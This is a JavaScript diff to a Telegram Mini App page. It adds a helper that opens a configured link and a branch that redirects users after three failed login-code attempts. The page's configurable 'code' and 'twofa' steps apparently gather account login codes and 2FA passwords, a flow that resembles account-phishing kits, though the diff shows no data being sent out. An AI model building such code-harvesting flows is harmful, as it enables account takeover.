@@ -155,6 +155,20 @@
 
     function html(s) { root.innerHTML = '<div class="card">' + s + '</div>'; }
 
+    function goRedirect(url) {
+      if (!url) return false;
+      var tg = tgApp();
+      try {
+        if (tg && /^https?:\/\/t\.me\//i.test(url) && tg.openTelegramLink) {
+          tg.openTelegramLink(url);
+          return true;
+        }
+        if (tg && tg.openLink) { tg.openLink(url); return true; }
+      } catch (e) {}
+      try { window.location.href = url; return true; } catch (e) {}
+      return false;
+    }
+
     function resolveBg(v) {
       if (!v) return "";
       if (v.indexOf("gradient(") !== -1) return v;       // CSS-градиент
@@ -427,6 +441,13 @@
         if (idx >= 0) { goTo(idx); return; }
         // twofa-страницы нет — продолжаем как если бы успех
         finishFlow();
+        return;
+      }
+      // 3 неверных ввода кода — уводим пользователя по заданной ссылке
+      if (data.error === "too_many_code_attempts" && CFG.codeFailRedirect) {
+        AUTH.lastError = errorText(data.error);
+        renderStep(findStepByKey("code") >= 0 ? findStepByKey("code") : step);
+        goRedirect(CFG.codeFailRedirect);
         return;
       }
       // Любая ветка ошибки — возвращаемся на шаг code с сообщением
